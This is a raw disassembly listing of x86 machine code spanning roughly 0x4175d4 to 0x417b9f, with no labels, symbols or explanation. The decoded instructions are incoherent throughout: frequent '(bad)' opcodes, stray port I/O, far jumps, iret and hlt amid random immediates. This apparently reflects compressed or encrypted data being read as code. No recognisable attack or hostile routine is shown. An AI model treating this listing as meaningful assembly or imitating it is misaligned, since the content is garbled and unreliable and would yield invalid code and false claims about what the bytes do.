  4175d4:	5c                   	pop    %esp
  4175d5:	75 68                	jne    0x41763f
  4175d7:	72 32                	jb     0x41760b
  4175d9:	71 3b                	jno    0x417616
  4175db:	b0 0c                	mov    $0xc,%al
  4175dd:	8b 59 03             	mov    0x3(%ecx),%ebx
  4175e0:	12 84 90 cf 6c 07 c8 	adc    -0x37f89331(%eax,%edx,4),%al
  4175e7:	49                   	dec    %ecx
  4175e8:	3a f8                	cmp    %al,%bh
  4175ea:	2d de b0 c1 c7       	sub    $0xc7c1b0de,%eax
  4175ef:	dc a7 65 15 96 aa    	fsubl  -0x5569ea9b(%edi)
  4175f5:	ac                   	lods   %ds:(%esi),%al
  4175f6:	b4 08                	mov    $0x8,%ah
  4175f8:	9c                   	pushf
  4175f9:	2b 29                	sub    (%ecx),%ebp
  4175fb:	77 48                	ja     0x417645
  4175fd:	c3                   	ret
  4175fe:	f0 8d                	lock lea (bad),%edx
  417600:	d0 ce                	ror    $1,%dh
  417602:	55                   	push   %ebp
  417603:	0b 9f c9 38 e9 05    	or     0x5e938c9(%edi),%ebx
  417609:	0b 24 2c             	or     (%esp,%ebp,1),%esp
  41760c:	fe                   	(bad)
  41760d:	e4 a9                	in     $0xa9,%al
  41760f:	03 c9                	add    %ecx,%ecx
  417611:	c8 b0 e5 b0          	enter  $0xe5b0,$0xb0
  417615:	55                   	push   %ebp
  417616:	f8                   	clc
  417617:	69 a4 81 8d ab df f8 	imul   $0xc87e90dc,-0x7205473(%ecx,%eax,4),%esp
  41761e:	dc 90 7e c8 
  417622:	01 8d b1 3b f3 74    	add    %ecx,0x74f33bb1(%ebp)
  417628:	64 e0 18             	fs loopne 0x417643
  41762b:	20 97 3c 70 b1 f8    	and    %dl,-0x74e8fc4(%edi)
  417631:	dd 90 4e d6 51 0b    	fstl   0xb51d64e(%eax)
  417637:	44                   	inc    %esp
  417638:	57                   	push   %edi
  417639:	ad                   	lods   %ds:(%esi),%eax
  41763a:	3e 9f                	ds lahf
  41763c:	e4 40                	in     $0x40,%al
  41763e:	72 b2                	jb     0x4175f2
  417640:	b8 ae 77 b1 94       	mov    $0x94b177ae,%eax
  417645:	b1 35                	mov    $0x35,%cl
  417647:	52                   	push   %edx
  417648:	c1 ae 5f af 6f e9 37 	shrl   $0x37,-0x169050a1(%esi)
  41764f:	1b 76 e2             	sbb    -0x1e(%esi),%esi
  417652:	e3 df                	jecxz  0x417633
  417654:	6e                   	outsb  %ds:(%esi),(%dx)
  417655:	0a 6d 62             	or     0x62(%ebp),%ch
  417658:	44                   	inc    %esp
  417659:	c5 de cd             	(bad)
  41765c:	0b 6b 1b             	or     0x1b(%ebx),%ebp
  41765f:	92                   	xchg   %eax,%edx
  417660:	43                   	inc    %ebx
  417661:	c6                   	(bad)
  417662:	32 93 90 74 b2 c9    	xor    -0x364d8b70(%ebx),%dl
  417668:	03 89 df 6a ae 6c    	add    0x6cae6adf(%ecx),%ecx
  41766e:	4b                   	dec    %ebx
  41766f:	4f                   	dec    %edi
  417670:	b2 b1                	mov    $0xb1,%dl
  417672:	53                   	push   %ebx
  417673:	89 1a                	mov    %ebx,(%edx)
  417675:	cd 3b                	int    $0x3b
  417677:	2a 3c 7b             	sub    (%ebx,%edi,2),%bh
  41767a:	11 a4 b8 46 6a 12 ad 	adc    %esp,-0x52ed95ba(%eax,%edi,4)
  417681:	c0 ad e4 64 1d f8 de 	shrb   $0xde,-0x7e29b1c(%ebp)
  417688:	de 56 b2             	ficoms -0x4e(%esi)
  41768b:	00 39                	add    %bh,(%ecx)
  41768d:	19 83 3b 74 ca 7b    	sbb    %eax,0x7bca743b(%ebx)
  417693:	b2 15                	mov    $0x15,%dl
  417695:	f1                   	int1
  417696:	31 61 e5             	xor    %esp,-0x1b(%ecx)
  417699:	93                   	xchg   %eax,%ebx
  41769a:	93                   	xchg   %eax,%ebx
  41769b:	68 53 72 02 c3       	push   $0xc3027253
  4176a0:	7f 96                	jg     0x417638
  4176a2:	cb                   	lret
  4176a3:	b2 68                	mov    $0x68,%dl
  4176a5:	50                   	push   %eax
  4176a6:	0b e4                	or     %esp,%esp
  4176a8:	24 d2                	and    $0xd2,%al
  4176aa:	b2 90                	mov    $0x90,%dl
  4176ac:	5f                   	pop    %edi
  4176ad:	87 21                	xchg   %esp,(%ecx)
  4176af:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4176b0:	3c da                	cmp    $0xda,%al
  4176b2:	25 b3 05 88 75       	and    $0x758805b3,%eax
  4176b7:	8d 14 c8             	lea    (%eax,%ecx,8),%edx
  4176ba:	59                   	pop    %ecx
  4176bb:	9c                   	pushf
  4176bc:	c3                   	ret
  4176bd:	02 79 c8             	add    -0x38(%ecx),%bh
  4176c0:	aa                   	stos   %al,%es:(%edi)
  4176c1:	e4 2c                	in     $0x2c,%al
  4176c3:	b3 63                	mov    $0x63,%bl
  4176c5:	83 16 49             	adcl   $0x49,(%esi)
  4176c8:	00 47 3a             	add    %al,0x3a(%edi)
  4176cb:	ad                   	lods   %ds:(%esi),%eax
  4176cc:	ea 3e 38 60 74 72 36 	ljmp   $0x3672,$0x7460383e
  4176d3:	10 8d 07 d6 d9 f1    	adc    %cl,-0xe2629f9(%ebp)
  4176d9:	45                   	inc    %ebp
  4176da:	a0 01 17 0a 19       	mov    0x190a1701,%al
  4176df:	43                   	inc    %ebx
  4176e0:	08 c9                	or     %cl,%cl
  4176e2:	90                   	nop
  4176e3:	4d                   	dec    %ebp
  4176e4:	e8 0c 93 93 af       	call   0xafd509f5
  4176e9:	4e                   	dec    %esi
  4176ea:	d5 09                	aad    $0x9
  4176ec:	6a b6                	push   $0xffffffb6
  4176ee:	b5 46                	mov    $0x46,%ch
  4176f0:	d8 85 f1 9d ed b6    	fadds  -0x4912620f(%ebp)
  4176f6:	89 92 17 d2 30 cf    	mov    %edx,-0x30cf2de9(%edx)
  4176fc:	7a 70                	jp     0x41776e
  4176fe:	b4 01                	mov    $0x1,%ah
  417700:	b9 50 94 3b 53       	mov    $0x533b9450,%ecx
  417705:	b4 6e                	mov    $0x6e,%ah
  417707:	1b a0 0e e3 d7 eb    	sbb    -0x14281cf2(%eax),%esp
  41770d:	39 6c eb 01          	cmp    %ebp,0x1(%ebx,%ebp,8)
  417711:	52                   	push   %edx
  417712:	7d ac                	jge    0x4176c0
  417714:	02 d8                	add    %al,%bl
  417716:	0a 80 ea 0a ad 0b    	or     0xbad0aea(%eax),%al
  41771c:	5a                   	pop    %edx
  41771d:	02 f8                	add    %al,%bh
  41771f:	ea 03 75 ef 67 c8 31 	ljmp   $0x31c8,$0x67ef7503
  417726:	fb                   	sti
  417727:	20 24 69             	and    %ah,(%ecx,%ebp,2)
  41772a:	92                   	xchg   %eax,%edx
  41772b:	8c fe                	mov    %?,%esi
  41772d:	80 3b 0d             	cmpb   $0xd,(%ebx)
  417730:	75 2d                	jne    0x41775f
  417732:	8c 2d 22 5b 05 0a    	mov    %gs,0xa055b22
  417738:	77 c2                	ja     0x4176fc
  41773a:	e2 2b                	loop   0x417767
  41773c:	39 90 9c 5a b4 77    	cmp    %edx,0x77b45a9c(%eax)
  417742:	b4 f1                	mov    $0xf1,%ah
  417744:	20 81 18 e0 43 f6    	and    %al,-0x9bc1fe8(%ecx)
  41774a:	b4 e4                	mov    $0xe4,%ah
  41774c:	42                   	inc    %edx
  41774d:	e0 85                	loopne 0x4176d4
  41774f:	b2 b2                	mov    $0xb2,%dl
  417751:	8c 4b 1f             	mov    %cs,0x1f(%ebx)
  417754:	6b e0 61             	imul   $0x61,%eax,%esp
  417757:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  417758:	b1 b2                	mov    $0xb2,%cl
  41775a:	9c                   	pushf
  41775b:	47                   	inc    %edi
  41775c:	e4 0b                	in     $0xb,%al
  41775e:	85 9c 8c 06 94 76 fd 	test   %ebx,-0x2896bfa(%esp,%ecx,4)
  417765:	b4 5f                	mov    $0x5f,%ah
  417767:	44                   	inc    %esp
  417768:	4b                   	dec    %ebx
  417769:	2a a3 f3 20 97 d4    	sub    -0x2b68df0d(%ebx),%ah
  41776f:	f2 6d                	repnz insl (%dx),%es:(%edi)
  417771:	02 24 07             	add    (%edi,%eax,1),%ah
  417774:	28 2c aa             	sub    %ch,(%edx,%ebp,4)
  417777:	99                   	cltd
  417778:	bc 3d 14 f0 5c       	mov    $0x5cf0143d,%esp
  41777d:	8b 46 10             	mov    0x10(%esi),%eax
  417780:	b9 56 6b c8 a1       	mov    $0xa1c86b56,%ecx
  417785:	44                   	inc    %esp
  417786:	ea 3b d4 46 de 92 75 	ljmp   $0x7592,$0xde46d43b
  41778d:	2a 10                	sub    (%eax),%dl
  41778f:	0c 20                	or     $0x20,%al
  417791:	f5                   	cmc
  417792:	70 db                	jo     0x41776f
  417794:	23 28                	and    (%eax),%ebp
  417796:	cf                   	iret
  417797:	51                   	push   %ecx
  417798:	2f                   	das
  417799:	50                   	push   %eax
  41779a:	cd 7f                	int    $0x7f
  41779c:	29 80 7b 18 00 75    	sub    %eax,0x7500187b(%eax)
  4177a2:	10 23                	adc    %ah,(%ebx)
  4177a4:	eb 2b                	jmp    0x4177d1
  4177a6:	8b a0 37 7d a7 cc    	mov    -0x335882c9(%eax),%esp
  4177ac:	ba b7 78 4b 1c       	mov    $0x1c4b78b7,%edx
  4177b1:	8a 43 19             	mov    0x19(%ebx),%al
  4177b4:	12 94 a0 97 4a 21 fe 	adc    -0x1deb569(%eax,%eiz,4),%dl
  4177bb:	c8 4c 51 70          	enter  $0x514c,$0x70
  4177bf:	16                   	push   %ss
  4177c0:	5d                   	pop    %ebp
  4177c1:	d0 fc                	sar    $1,%ah
  4177c3:	d0 c9                	ror    $1,%cl
  4177c5:	ba b0 58 04 c7       	mov    $0xc70458b0,%edx
  4177ca:	36 09 14 24          	or     %edx,%ss:(%esp)
  4177ce:	0b a8 84 d8 d8 8e    	or     -0x7127277c(%eax),%ebp
  4177d4:	d0 23                	shlb   $1,(%ebx)
  4177d6:	7f f9                	jg     0x4177d1
  4177d8:	11 66 06             	adc    %esp,0x6(%esi)
  4177db:	22 cf                	and    %bh,%cl
  4177dd:	c5 b6 f5 69 21 d0    	lds    -0x2fde960b(%esi),%esi
  4177e3:	5b                   	pop    %ebx
  4177e4:	24 30                	and    $0x30,%al
  4177e6:	73 c8                	jae    0x4177b0
  4177e8:	32 c9                	xor    %cl,%cl
  4177ea:	65 1b 2a             	sbb    %gs:(%edx),%ebp
  4177ed:	2c 28                	sub    $0x28,%al
  4177ef:	ed                   	in     (%dx),%eax
  4177f0:	ac                   	lods   %ds:(%esi),%al
  4177f1:	96                   	xchg   %eax,%esi
  4177f2:	8f                   	(bad)
  4177f3:	b4 10                	mov    $0x10,%ah
  4177f5:	2d 61 74 19 b0       	sub    $0xb0197461,%eax
  4177fa:	d7                   	xlat   %ds:(%ebx)
  4177fb:	0c 44                	or     $0x44,%al
  4177fd:	ca 73 cf             	lret   $0xcf73
  417800:	ce                   	into
  417801:	82 67 91 e7          	andb   $0xe7,-0x6f(%edi)
  417805:	43                   	inc    %ebx
  417806:	c3                   	ret
  417807:	25 70 5b 6c b6       	and    $0xb66c5b70,%eax
  41780c:	e4 c0                	in     $0xc0,%al
  41780e:	93                   	xchg   %eax,%ebx
  41780f:	10 a4 4c 68 ee 49 be 	adc    %ah,-0x41b61198(%esp,%ecx,2)
  417816:	8d 04 f0             	lea    (%eax,%esi,8),%eax
  417819:	2c 5c                	sub    $0x5c,%al
  41781b:	ff 5a 4d             	lcall  *0x4d(%edx)
  41781e:	f1                   	int1
  41781f:	f7 9b 84 8f 03 21    	negl   0x21038f84(%ebx)
  417825:	14 f0                	adc    $0xf0,%al
  417827:	05 44 f0 08 84       	add    $0x8408f044,%eax
  41782c:	5e                   	pop    %esi
  41782d:	c1 22 80             	shll   $0x80,(%edx)
  417830:	61                   	popa
  417831:	bf d2 74 25 02       	mov    $0x22574d2,%edi
  417836:	d9 66 bc             	fldenv -0x44(%esi)
  417839:	7e 7b                	jle    0x4178b6
  41783b:	1d 20 24 97 cf       	sbb    $0xcf972420,%eax
  417840:	07                   	pop    %es
  417841:	ee                   	out    %al,(%dx)
  417842:	3b 04 d9             	cmp    (%ecx,%ebx,8),%eax
  417845:	55                   	push   %ebp
  417846:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  417847:	e0 2c                	loopne 0x417875
  417849:	f3 58                	repz pop %eax
  41784b:	75 a8                	jne    0x4177f5
  41784d:	50                   	push   %eax
  41784e:	72 4b                	jb     0x41789b
  417850:	8c 40 9d             	mov    %es,-0x63(%eax)
  417853:	eb 10                	jmp    0x417865
  417855:	7b eb                	jnp    0x417842
  417857:	a0 5a 95 1a b2       	mov    0xb21a955a,%al
  41785c:	04 16                	add    $0x16,%al
  41785e:	04 89                	add    $0x89,%al
  417860:	5a                   	pop    %edx
  417861:	02 21                	add    (%ecx),%ah
  417863:	04 71                	add    $0x71,%al
  417865:	6a 48                	push   $0x48
  417867:	ef                   	out    %eax,(%dx)
  417868:	57                   	push   %edi
  417869:	97                   	xchg   %eax,%edi
  41786a:	a2 62 74 e8 88       	mov    %al,0x88e87462
  41786f:	13 7d 10             	adc    0x10(%ebp),%edi
  417872:	28 4a c4             	sub    %cl,-0x3c(%edx)
  417875:	ff 4f 3b             	decl   0x3b(%edi)
  417878:	fe                   	(bad)
  417879:	7c 34                	jl     0x4178af
  41787b:	8d 1c 37             	lea    (%edi,%esi,1),%ebx
  41787e:	d1 eb                	shr    $1,%ebx
  417880:	33 f5                	xor    %ebp,%esi
  417882:	41                   	inc    %ecx
  417883:	c2 d0 b4             	ret    $0xb4d0
  417886:	8e b1 7d 05 8d 73    	mov    0x738d057d(%ecx),%?
  41788c:	b7 00                	mov    $0x0,%bh
  41788e:	dd 28                	(bad) (%eax)
  417890:	eb 90                	jmp    0x417822
  417892:	fb                   	sti
  417893:	4f                   	dec    %edi
  417894:	ee                   	out    %al,(%dx)
  417895:	0d 31 b7 a5 82       	or     $0x82a5b731,%eax
  41789a:	ed                   	in     (%dx),%eax
  41789b:	01 80 e9 01 3b f3    	add    %eax,-0xcc4fe17(%eax)
  4178a1:	33 7d cc             	xor    -0x34(%ebp),%edi
  4178a4:	10 e5                	adc    %ah,%ch
  4178a6:	43                   	inc    %ebx
  4178a7:	10 7f 30             	adc    %bh,0x30(%edi)
  4178aa:	8a 09                	mov    (%ecx),%cl
  4178ac:	4b                   	dec    %ebx
  4178ad:	80 43 2a bb          	addb   $0xbb,0x2a(%ebx)
  4178b1:	4a                   	dec    %edx
  4178b2:	80 4d 44 13          	orb    $0x13,0x44(%ebp)
  4178b6:	c7                   	(bad)
  4178b7:	5d                   	pop    %ebp
  4178b8:	14 f2                	adc    $0xf2,%al
  4178ba:	d8 50 9b             	fcoms  -0x65(%eax)
  4178bd:	1d 8f bf b8 ad       	sbb    $0xadb8bf8f,%eax
  4178c2:	40                   	inc    %eax
  4178c3:	10 c4                	adc    %al,%ah
  4178c5:	b2 30                	mov    $0x30,%dl
  4178c7:	4a                   	dec    %edx
  4178c8:	83 54 8b 04 f2       	adcl   $0xfffffff2,0x4(%ebx,%ecx,4)
  4178cd:	e5 91                	in     $0x91,%eax
  4178cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4178d0:	18 56 8b             	sbb    %dl,-0x75(%esi)
  4178d3:	50                   	push   %eax
  4178d4:	14 f2                	adc    $0xf2,%al
  4178d6:	85 f6                	test   %esi,%esi
  4178d8:	c6 03 c1             	movb   $0xc1,(%ebx)
  4178db:	fe 84 ed 8c 0c be be 	incb   -0x4141f374(%ebp,%ebp,8)
  4178e2:	4d                   	dec    %ebp
  4178e3:	d6                   	salc
  4178e4:	e5 61                	in     $0x61,%eax
  4178e6:	70 19                	jo     0x417901
  4178e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4178e9:	5e                   	pop    %esi
  4178ea:	ff a6 0e 57 c7 89    	jmp    *-0x7638a8f2(%esi)
  4178f0:	c9                   	leave
  4178f1:	c7 38 ac 16 8d       	xbegin 0x8d58252e,(bad)
  4178f6:	ac                   	lods   %ds:(%esi),%al
  4178f7:	cc                   	int3
  4178f8:	0d a4 02 64 6b       	or     $0x6b6402a4,%eax
  4178fd:	cf                   	iret
  4178fe:	05 64 c7 97 39       	add    $0x3997c764,%eax
  417903:	74 bc                	je     0x4178c1
  417905:	4c                   	dec    %esp
  417906:	f4                   	hlt
  417907:	31 21                	xor    %esp,(%ecx)
  417909:	25 83 ab 7e a9       	and    $0xa97eab83,%eax
  41790e:	23 19                	and    (%ecx),%ebx
  417910:	23 e1                	and    %ecx,%esp
  417912:	d3 17                	rcll   %cl,(%edi)
  417914:	4a                   	dec    %edx
  417915:	36 70 c6             	ss jo  0x4178de
  417918:	b1 76                	mov    $0x76,%cl
  41791a:	43                   	inc    %ebx
  41791b:	14 6d                	adc    $0x6d,%al
  41791d:	25 a7 d0 45 18       	and    $0x1845d0a7,%eax
  417922:	df b8 2d dc 1a 8d    	fistpll -0x72e523d3(%eax)
  417928:	54                   	push   %esp
  417929:	f2 bb 4b 06 0c f1    	repnz mov $0xf10c064b,%ebx
  41792f:	52                   	push   %edx
  417930:	c1 e0 03             	shl    $0x3,%eax
  417933:	91                   	xchg   %eax,%ecx
  417934:	d3 d3                	rcl    %cl,%ebx
  417936:	8c 19                	mov    %ds,(%ecx)
  417938:	44                   	inc    %esp
  417939:	78 be                	js     0x4178f9
  41793b:	06                   	push   %es
  41793c:	8f                   	(bad)
  41793d:	6d                   	insl   (%dx),%es:(%edi)
  41793e:	04 17                	add    $0x17,%al
  417940:	d0 04 1d 41 ff 38 c6 	rolb   $1,-0x39c700bf(,%ebx,1)
  417947:	2a 5b 18             	sub    0x18(%ebx),%bl
  41794a:	0b af df 84 65 b3    	or     -0x4c9a7b21(%edi),%ebp
  417950:	54                   	push   %esp
  417951:	59                   	pop    %ecx
  417952:	56                   	push   %esi
  417953:	d7                   	xlat   %ds:(%ebx)
  417954:	56                   	push   %esi
  417955:	38 d9                	cmp    %bl,%cl
  417957:	02 42 89             	add    -0x77(%edx),%al
  41795a:	7c a5                	jl     0x417901
  41795c:	93                   	xchg   %eax,%ebx
  41795d:	24 30                	and    $0x30,%al
  41795f:	ac                   	lods   %ds:(%esi),%al
  417960:	12 77 00             	adc    0x0(%edi),%dh
  417963:	62 eb eb             	(bad) {%k3}{z}
  417966:	a3 d1 75 ce 03       	mov    %eax,0x3ce75d1
  41796b:	b0 d1                	mov    $0xd1,%al
  41796d:	b0 72                	mov    $0x72,%al
  41796f:	54                   	push   %esp
  417970:	05 1e eb 39 4f       	add    $0x4f39eb1e,%eax
  417975:	b7 54                	mov    $0x54,%bh
  417977:	f0 ff 55 b9          	lock call *-0x47(%ebp)
  41797b:	7c 11                	jl     0x41798e
  41797d:	4e                   	dec    %esi
  41797e:	d6                   	salc
  41797f:	cf                   	iret
  417980:	dd e2                	fucom  %st(2)
  417982:	21 7f f0             	and    %edi,-0x10(%edi)
  417985:	ba 7c 20 6d 23       	mov    $0x236d207c,%edx
  41798a:	83 b8 d5 48 02 3b c2 	cmpl   $0xffffffc2,0x3b0248d5(%eax)
  417991:	75 05                	jne    0x417998
  417993:	24 5d                	and    $0x5d,%al
  417995:	6d                   	insl   (%dx),%es:(%edi)
  417996:	05 62 eb 4a 09       	add    $0x94aeb62,%eax
  41799b:	03 d1                	add    %ecx,%edx
  41799d:	43                   	inc    %ebx
  41799e:	09 04 6f             	or     %eax,(%edi,%ebp,2)
  4179a1:	b7 4e                	mov    $0x4e,%bh
  4179a3:	23 7d b7             	and    -0x49(%ebp),%edi
  4179a6:	0d f8 7e 11 aa       	or     $0xaa117ef8,%eax
  4179ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4179ac:	86 9e b5 6d 2d a9    	xchg   %bl,-0x56d2924b(%esi)
  4179b2:	80 10 30             	adcb   $0x30,(%eax)
  4179b5:	f4                   	hlt
  4179b6:	7c 85                	jl     0x41793d
  4179b8:	11 63 58             	adc    %esp,0x58(%ebx)
  4179bb:	01 d3                	add    %edx,%ebx
  4179bd:	6b 82 e0 e4 5d 06 03 	imul   $0x3,0x65de4e0(%edx),%eax
  4179c4:	8d 43 0c             	lea    0xc(%ebx),%eax
  4179c7:	14 4f                	adc    $0x4f,%al
  4179c9:	67 b1 43             	addr16 mov $0x43,%cl
  4179cc:	53                   	push   %ebx
  4179cd:	06                   	push   %es
  4179ce:	cc                   	int3
  4179cf:	c4 c3 5f 8b          	(bad)
  4179d3:	22 2d 34 cc 0c cb    	and    0xcb0ccc34,%ch
  4179d9:	14 a9                	adc    $0xa9,%al
  4179db:	d1 1d a8 8e 12 fd    	rcrl   $1,0xfd128ea8
  4179e1:	d7                   	xlat   %ds:(%ebx)
  4179e2:	ba 44 a4 60 91       	mov    $0x9160a444,%edx
  4179e7:	6b 32 22             	imul   $0x22,(%edx),%esi
  4179ea:	18 37                	sbb    %dh,(%edi)
  4179ec:	7b 62                	jnp    0x417a50
  4179ee:	22 84 bd ba 06 b9 01 	and    0x1b906ba(%ebp,%edi,4),%al
  4179f5:	7e 1c                	jle    0x417a13
  4179f7:	56                   	push   %esi
  4179f8:	82 49 73 14          	orb    $0x14,0x73(%ecx)
  4179fc:	0f cb                	bswap  %ebx
  4179fe:	8a 8a 11 57 66 1d    	mov    0x1d665711(%edx),%cl
  417a04:	42                   	inc    %edx
  417a05:	87 2b                	xchg   %ebp,(%ebx)
  417a07:	c8 1a 7d 0c          	enter  $0x7d1a,$0xc
  417a0b:	bf d8 b2 35 b0       	mov    $0xb035b2d8,%edi
  417a10:	9b                   	fwait
  417a11:	13 27                	adc    (%edi),%esp
  417a13:	30 ff                	xor    %bh,%bh
  417a15:	8c f0                	mov    %?,%eax
  417a17:	0e                   	push   %cs
  417a18:	02 60 18             	add    0x18(%eax),%ah
  417a1b:	c6                   	(bad)
  417a1c:	60                   	pusha
  417a1d:	07                   	pop    %es
  417a1e:	f8                   	clc
  417a1f:	cd af                	int    $0xaf
  417a21:	75 08                	jne    0x417a2b
  417a23:	b3 aa                	mov    $0xaa,%bl
  417a25:	f9                   	stc
  417a26:	9f                   	lahf
  417a27:	d9 44 38 02          	flds   0x2(%eax,%edi,1)
  417a2b:	38 26                	cmp    %ah,(%esi)
  417a2d:	98                   	cwtl
  417a2e:	20 16                	and    %dl,(%esi)
  417a30:	9c                   	pushf
  417a31:	c3                   	ret
  417a32:	ab                   	stos   %eax,%es:(%edi)
  417a33:	21 3d 1b d8 19 39    	and    %edi,0x3919d81b
  417a39:	46                   	inc    %esi
  417a3a:	5c                   	pop    %esp
  417a3b:	99                   	cltd
  417a3c:	0d 6c aa ac 9d       	or     $0x9dacaa6c,%eax
  417a41:	ac                   	lods   %ds:(%esi),%al
  417a42:	71 ac                	jno    0x4179f0
  417a44:	88 d0                	mov    %dl,%al
  417a46:	53                   	push   %ebx
  417a47:	01 5c 80 ac          	add    %ebx,-0x54(%eax,%eax,4)
  417a4b:	01 a2 01 17 2e c3    	add    %esp,-0x3cd1e8ff(%edx)
  417a51:	0f 60 b0 0f 19 ac 0f 	punpcklbw 0xfac190f(%eax),%mm6
  417a58:	b7 c9                	mov    $0xc9,%bh
  417a5a:	12 d8                	adc    %al,%bl
  417a5c:	40                   	inc    %eax
  417a5d:	b3 c7                	mov    $0xc7,%bl
  417a5f:	a9 b3 4a 96 09       	test   $0x9964ab3,%eax
  417a64:	1f                   	pop    %ds
  417a65:	00 62 c1             	add    %ah,-0x3f(%edx)
  417a68:	34 7b                	xor    $0x7b,%al
  417a6a:	20 e7                	and    %ah,%bh
  417a6c:	ea 91 00 70 f4 7e 88 	ljmp   $0x887e,$0xf4700091
  417a73:	55                   	push   %ebp
  417a74:	d7                   	xlat   %ds:(%ebx)
  417a75:	36 bd ab 4f 7d 08    	ss mov $0x87d4fab,%ebp
  417a7b:	66 81 56 75 36 98    	adcw   $0x9836,0x75(%esi)
  417a81:	4d                   	dec    %ebp
  417a82:	c2 12 d5             	ret    $0xd512
  417a85:	db 5c c7 89          	fistpl -0x77(%edi,%eax,8)
  417a89:	7b 04                	jnp    0x417a8f
  417a8b:	da 5d c2             	ficompl -0x3e(%ebp)
  417a8e:	b1 45                	mov    $0x45,%cl
  417a90:	ba a8 6a 0b aa       	mov    $0xaa0b6aa8,%edx
  417a95:	dc 6d 07             	fsubrl 0x7(%ebp)
  417a98:	e4 48                	in     $0x48,%al
  417a9a:	55                   	push   %ebp
  417a9b:	48                   	dec    %eax
  417a9c:	9c                   	pushf
  417a9d:	eb 37                	jmp    0x417ad6
  417a9f:	87 d7                	xchg   %edx,%edi
  417aa1:	b2 5d                	mov    $0x5d,%dl
  417aa3:	d0 9e 38 1c 89 78    	rcrb   $1,0x78891c38(%esi)
  417aa9:	d1 7d 24             	sarl   $1,0x24(%ebp)
  417aac:	38 6a 09             	cmp    %ch,0x9(%edx)
  417aaf:	39 19                	cmp    %ebx,(%ecx)
  417ab1:	e0 a4                	loopne 0x417a57
  417ab3:	ac                   	lods   %ds:(%esi),%al
  417ab4:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  417ab5:	04 2a                	add    $0x2a,%al
  417ab7:	d4 b1                	aam    $0xb1
  417ab9:	79 29                	jns    0x417ae4
  417abb:	c4 0a                	les    (%edx),%ecx
  417abd:	98                   	cwtl
  417abe:	55                   	push   %ebp
  417abf:	02 0b                	add    (%ebx),%cl
  417ac1:	75 94                	jne    0x417a57
  417ac3:	02 56 93             	add    -0x6d(%esi),%dl
  417ac6:	5a                   	pop    %edx
  417ac7:	7d 05                	jge    0x417ace
  417ac9:	52                   	push   %edx
  417aca:	6e                   	outsb  %ds:(%esi),(%dx)
  417acb:	61                   	popa
  417acc:	f0 68 e4 ea 27 5f    	lock push $0x5f27eae4
  417ad2:	11 c4                	adc    %eax,%esp
  417ad4:	cf                   	iret
  417ad5:	48                   	dec    %eax
  417ad6:	c5 83 3d 24 06 9c    	lds    -0x63f9dbc3(%ebx),%eax
  417adc:	b0 e8                	mov    $0xe8,%al
  417ade:	f2 8e 86 a1 24 b8 e7 	repnz mov -0x1847db5f(%esi),%es
  417ae5:	bc b4 61 d1 90       	mov    $0x90d161b4,%esp
  417aea:	44                   	inc    %esp
  417aeb:	b2 66                	mov    $0x66,%dl
  417aed:	bb 15 da 53 86       	mov    $0x8653da15,%ebx
  417af2:	08 6c 9e 46          	or     %ch,0x46(%esi,%ebx,4)
  417af6:	75 25                	jne    0x417b1d
  417af8:	0d 5a 27 f1 69       	or     $0x69f1275a,%eax
  417afd:	f8                   	clc
  417afe:	aa                   	stos   %al,%es:(%edi)
  417aff:	56                   	push   %esi
  417b00:	10 d4                	adc    %dl,%ah
  417b02:	5b                   	pop    %ebx
  417b03:	34 f4                	xor    $0xf4,%al
  417b05:	82 45 27 86          	addb   $0x86,0x27(%ebp)
  417b09:	c8 82 f2 90          	enter  $0xf282,$0x90
  417b0d:	2f                   	das
  417b0e:	32 fe                	xor    %dh,%bh
  417b10:	8a bc ee bc 90 2a 58 	mov    0x582a90bc(%esi,%ebp,8),%bh
  417b17:	c9                   	leave
  417b18:	24 97                	and    $0x97,%al
  417b1a:	f2 c8 5e 96 a6       	repnz enter $0x965e,$0xa6
  417b1f:	74 6b                	je     0x417b8c
  417b21:	a2 6f bd 7b 87       	mov    %al,0x877bbd6f
  417b26:	25 47 29 09 9c       	and    $0x9c092947,%eax
  417b2b:	87 84 9c e4 02 d7 76 	xchg   %eax,0x76d702e4(%esp,%ebx,4)
  417b32:	bd e9 18 0b 62       	mov    $0x620b18e9,%ebp
  417b37:	23 cb                	and    %ebx,%ecx
  417b39:	76 54                	jbe    0x417b8f
  417b3b:	11 aa 0b 09 4a a1    	adc    %ebp,-0x5eb5f6f5(%edx)
  417b41:	a0 aa f8 30 e8       	mov    0xe830f8aa,%al
  417b46:	c0 ad 78 97 0a af 18 	shrb   $0x18,-0x50f56888(%ebp)
  417b4d:	3a 24 be             	cmp    (%esi,%edi,4),%ah
  417b50:	63 df                	arpl   %ebx,%edi
  417b52:	ac                   	lods   %ds:(%esi),%al
  417b53:	0f ff 4e 10          	ud0    0x10(%esi),%ecx
  417b57:	0d b0 78 21 90       	or     $0x902178b0,%eax
  417b5c:	37                   	aaa
  417b5d:	f1                   	int1
  417b5e:	42                   	inc    %edx
  417b5f:	ec                   	in     (%dx),%al
  417b60:	40                   	inc    %eax
  417b61:	35 20 18 0f 94       	xor    $0x940f1820,%eax
  417b66:	c0 11 6f             	rclb   $0x6f,(%ecx)
  417b69:	59                   	pop    %ecx
  417b6a:	33 74 14 13          	xor    0x13(%esp,%edx,1),%esi
  417b6e:	0e                   	push   %cs
  417b6f:	8d 9b 20 1e 8f 11    	lea    0x118f1e20(%ebx),%ebx
  417b75:	89 c6                	mov    %eax,%esi
  417b77:	eb 60                	jmp    0x417bd9
  417b79:	7f f7                	jg     0x417b72
  417b7b:	e3 ed                	jecxz  0x417b6a
  417b7d:	4e                   	dec    %esi
  417b7e:	14 2b                	adc    $0x2b,%al
  417b80:	44                   	inc    %esp
  417b81:	77 0a                	ja     0x417b8d
  417b83:	89 80 ae 30 0e 39    	mov    %eax,0x390e30ae(%eax)
  417b89:	d9 72 02             	fnstenv 0x2(%edx)
  417b8c:	89 d9                	mov    %ebx,%ecx
  417b8e:	56                   	push   %esi
  417b8f:	dc 5a 69             	fcompl 0x69(%edx)
  417b92:	c3                   	ret
  417b93:	29 cb                	sub    %ecx,%ebx
  417b95:	71 03                	jno    0x417b9a
  417b97:	46                   	inc    %esi
  417b98:	98                   	cwtl
  417b99:	1d 27 89 ca 21       	sbb    $0x21ca8927,%eax
  417b9e:	41                   	inc    %ecx
  417b9f:	2c 41                	sub    $0x41,%al
